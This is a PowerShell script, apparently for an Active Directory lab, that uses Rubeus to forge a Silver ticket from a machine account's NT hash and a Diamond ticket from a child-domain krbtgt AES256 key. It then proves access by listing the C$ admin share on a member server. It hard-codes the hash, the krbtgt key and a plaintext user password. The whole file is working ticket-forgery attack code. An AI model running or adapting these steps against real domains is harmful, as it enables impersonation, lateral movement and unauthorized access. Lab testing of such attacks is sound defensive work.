# WT011 Silver + WT012 Diamond — real-service verification on ws01
# Silver: forge TGS for cifs/mbr01 with MBR01$ NT hash (no KDC)
# Diamond: modify legit analyst_t1 TGT with child krbtgt AES256, ask TGS
$ErrorActionPreference = 'Continue'
$Rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$childSid = 'S-1-5-21-2616196951-1941128886-767624593'
$mbr01Nt = '3a01c6cd54eab57a78377d0ef10cef3f'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$dc = 'dc02.child.cadre.local'

klist purge 2>&1 | Out-Null

Write-Output '===== WT011 SILVER ====='
& $Rubeus silver /service:cifs/mbr01.child.cadre.local /rc4:$mbr01Nt /sid:$childSid /user:analyst_t1 /domain:child.cadre.local /ptt 2>&1 | Select-String -Pattern 'Action|Ticket|KRB|successfully|error|SID|User' | Select-Object -First 15 | ForEach-Object { $_.Line }

# Real-service verify: SMB to mbr01 using the forged silver ticket
Write-Output '--- SILVER REAL-SERVICE SMB ---'
$probe = cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1"
$probe | Select-Object -First 8 | ForEach-Object { Write-Output "SILVER_SMB|$_" }
klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 5 | ForEach-Object { Write-Output "SILVER_KERB|$_" }

klist purge 2>&1 | Out-Null
Start-Sleep -Seconds 1

Write-Output '===== WT012 DIAMOND ====='
# 1. Legit TGT
& $Rubeus asktgt /user:analyst_t1 /password:T13r_An@lyst! /domain:child.cadre.local /dc:$dc /outfile:C:\Tools\ADTools\wt012-legit-tgt.kirbi 2>&1 | Select-String -Pattern 'Ticket|KRB|successfully|error' | Select-Object -First 8 | ForEach-Object { Write-Output "DIAM_TGT|$_" }

# 2. Diamond: modify TGT with krbtgt AES256, ask TGS for cifs/mbr01
if (Test-Path 'C:\Tools\ADTools\wt012-legit-tgt.kirbi') {
    & $Rubeus diamond /ticket:C:\Tools\ADTools\wt012-legit-tgt.kirbi /krbtgt:$krbtgtAes /enctype:aes /service:cifs/mbr01.child.cadre.local /dc:$dc /ptt 2>&1 | Select-String -Pattern 'Action|Ticket|KRB|successfully|error|Encrypt|Request' | Select-Object -First 20 | ForEach-Object { Write-Output "DIAM|$_" }
}

# Real-service verify
Write-Output '--- DIAMOND REAL-SERVICE SMB ---'
$probe2 = cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1"
$probe2 | Select-Object -First 8 | ForEach-Object { Write-Output "DIAM_SMB|$_" }
klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 5 | ForEach-Object { Write-Output "DIAM_KERB|$_" }

klist purge 2>&1 | Out-Null
Write-Output 'WT011_012_DONE'
